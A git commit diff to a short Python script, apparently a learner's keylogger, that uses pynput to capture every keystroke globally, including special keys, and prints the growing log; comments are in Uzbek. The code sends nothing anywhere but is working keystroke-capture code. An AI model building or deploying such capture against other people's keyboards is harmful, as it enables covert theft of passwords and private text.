9eebb6b9f256cc074bc213a33a722c2f85e6a44f
= <mustafayevaxmadjon@gmail.com>
2024-10-20 21:34:32 +0500

    Logging Special Keys

--- main.py
+++ main.py
@@ -1,14 +1,21 @@
-# !/usr/bin/env python
+#!/usr/bin/env python
 
 import pynput.keyboard
+
 log = ""
 
-def proccess_key_press(key):
-  global log
-  log = log + str(key)
-  print(log)
+def process_key_press(key):
+    global log
+    try:
+        log += str(key.char)  # Agar tugma harf bo'lsa
+    except AttributeError:
+        if key == key.space:
+            log += " "  # Bo'sh joy tugmasi uchun
+        else:
+            log += f" [{key}] "  # Maxsus tugmalar uchun
+    print(log)  # Har bir bosilgan tugmadan so'ng logni chop etish
 
-keyboard_listener = pynput.keyboard.Listener(on_press=proccess_key_press)
+keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
 
 with keyboard_listener:
-  keyboard_listener.join()
+    keyboard_listener.join()
